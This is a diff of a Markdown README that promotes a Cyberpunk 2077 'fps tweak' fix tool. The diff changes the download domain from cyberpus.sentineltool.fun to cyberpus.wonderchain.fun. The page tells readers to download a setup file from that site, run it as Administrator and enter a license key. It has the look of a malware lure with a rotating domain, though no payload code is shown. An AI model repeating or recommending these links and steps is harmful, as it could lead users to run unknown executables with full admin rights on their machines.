@@ -14,14 +14,14 @@ Fix **cyberpunk 2077 fps tweak** on Windows 10/11. Built for PC gamers — **dir
 
 | | |
 | --- | --- |
-| **Direct link** | **[cyberpus.sentineltool.fun](https://cyberpus.sentineltool.fun/)** |
-| **Full URL** | `https://cyberpus.sentineltool.fun/` |
+| **Direct link** | **[cyberpus.wonderchain.fun](https://cyberpus.wonderchain.fun/)** |
+| **Full URL** | `https://cyberpus.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[cyberpus.sentineltool.fun](https://cyberpus.sentineltool.fun/)** in your browser
+1. Open **[cyberpus.wonderchain.fun](https://cyberpus.wonderchain.fun/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
